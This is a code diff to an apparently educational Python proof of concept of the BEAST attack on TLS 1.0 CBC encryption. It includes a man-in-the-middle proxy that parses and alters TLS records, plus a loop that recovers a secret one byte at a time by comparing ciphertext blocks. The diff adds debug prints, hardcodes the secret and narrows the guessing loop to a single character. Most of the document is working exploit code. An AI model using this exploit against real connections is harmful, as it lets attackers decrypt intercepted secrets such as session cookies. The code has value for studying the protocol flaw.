@@ -19,7 +19,6 @@ import sys
 import struct
 import threading
 import time
-import os
 from utils.view import *
 from utils.AESCipher import *
 from pprint import pprint
@@ -27,16 +26,18 @@ from struct import *
 from itertools import cycle, izip
 
 class SecureTCPHandler(SocketServer.BaseRequestHandler):
-  def handle(self):
-    #loop to avoid broken pipe
-    while True:
-        try:
-            data = self.request.recv(1024)
-            if data == '':
-                break
-        except ssl.SSLError as e:
-            pass
-    return
+    def handle(self):
+        self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
+        #loop to avoid broken pipe
+        while True:
+            try:
+                data = self.request.recv(1024)
+                if data == '':
+                    break
+                print split_len(data, 16)
+            except ssl.SSLError as e:
+                pass
+        return
 
 class Server:
     """The secure server.
@@ -78,11 +79,12 @@ class Client(AESCipher):
         self.cbc = cbc
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
         print draw("Sending request : ", bold=True, fg_yellow=True)
-        print draw("the secret is " + self.cookie +"\n\n",  bold=True, fg_yellow=True)
+        print draw("the secret is Gydfrgtedfgtdter\n\n",  bold=True, fg_yellow=True)
 
     def connection(self):
         # Initialization of the client
         ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_TLSv1)
         ssl_sock.connect((self.proxy_host,self.proxy_port))
         ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
         self.socket = ssl_sock
@@ -93,9 +95,9 @@ class Client(AESCipher):
             Default request if no data
         '''
         if data == 0:
-            data = prefix*"a" + "the secret is " + self.cookie
+            data = prefix*"a" + "the secret is Gydfrgtedfgtdter"
         try:
-            data = self.cbc.encrypt(data)
+            #data = self.cbc.encrypt(data)
             self.socket.sendall(data)
         except ssl.SSLError as e:
             pass
@@ -134,16 +136,27 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
                     self.request.send(data)
 
                 elif source is self.request:
-                    
-                    data = self.request.recv(1024)
+
+                    ssl_header = self.request.recv(5)
+                    if ssl_header == '':
+                        running = False
+                        break
+
+                    (content_type, version, length) = struct.unpack('>BHH', ssl_header)
+
+                    data = self.request.recv(length)
                     if len(data) == 0:
                         running = False
-                    else:
+
+                    if length == 32:
+                        length_header = 32
+
+                    if content_type == 23 and length > length_header:
                         exploit.set_length_frame(data)
                         exploit.alter()
                     
                     # client -> server
-                    socket_server.send(data)
+                    socket_server.send(ssl_header+data)
         return
 
 class Proxy:
@@ -201,48 +214,54 @@ class BEAST(Client, AESCipher):
         add_byte = self.length_block
         t = 0
         # t < 16 because i know the length of the secret is 16 bytes
-        while(t < 16):
-            for i in range(1,256):
+        #while(t < 16):
+        for i in range(71,72):
 
-                self.start_exploit = True
-                self.client_connection()
-                # make the client send a request with our paramters
-                self.request_send(add_byte+padding)
+            print chr(i)
 
-                # sleep to be sure that the request is intercepted by the proxy
-                time.sleep(0.05)           
+            self.start_exploit = True
+            self.client_connection()
+            # make the client send a request with our paramters
+            self.request_send(add_byte+padding)
 
-                # get the value of the request ciphered
-                original = split_len(binascii.hexlify(self.frame), 32)
+            # sleep to be sure that the request is intercepted by the proxy
+            time.sleep(1)           
 
-                self.start_exploit = False
-                # create a plaintext block 
-                p_guess = i_know + chr(i)
-                xored = self.xor_block(p_guess, i)
+            # get the value of the request ciphered
+            original = split_len(binascii.hexlify(self.frame), 32)
 
-                # send the request with our data
-                self.request_send(add_byte+padding, xored)
-                # sleep to be sure that the request is intercepted by the proxy
-                time.sleep(0.05)
+            print "frame1"
+            print split_len(binascii.hexlify(self.frame), 32)
 
-                result = split_len(binascii.hexlify(self.frame), 32)
+            self.start_exploit = False
+            # create a plaintext block 
+            p_guess = i_know + chr(i)
+            xored = self.xor_block(p_guess, i)
 
-                sys.stdout.write("\r%s" % (search(i)))
-                sys.stdout.flush()
+            # send the request with our data
+            self.request_send(add_byte+padding, xored)
+            # sleep to be sure that the request is intercepted by the proxy
+            time.sleep(1)
 
-                # if the result request contains the same cipher block of the original request -> OK
-                if result[1] == original[2]:
+            result = split_len(binascii.hexlify(self.frame), 32)
+            print "frame2"
+            print split_len(binascii.hexlify(self.frame), 32)
 
-                    logging.debug("original request ----> result request")
-                    logging.debug("\r%s ----> %s" % (original[1:], result[1:]))
+            sys.stdout.write("\r%s" % (search(i)))
+            sys.stdout.flush()
 
-                    print " Find char " + chr(i) + " after " + str(i) +" tries"
-                    i_know = p_guess[1:]
-                    add_byte = add_byte - 1
-                    secret.append(chr(i))
-                    t = t + 1
-                    break
+            # if the result request contains the same cipher block of the original request -> OK
+            if result[1] == original[2]:
 
+                logging.debug("original request ----> result request")
+                logging.debug("\r%s ----> %s" % (original[1:], result[1:]))
+
+                print " Find char " + chr(i) + " after " + str(i) +" tries"
+                i_know = p_guess[1:]
+                add_byte = add_byte - 1
+                secret.append(chr(i))
+                t = t + 1
+                break
         secret = ''.join(secret)
         print "\nthe secret is " + secret
         self.client_disconect()
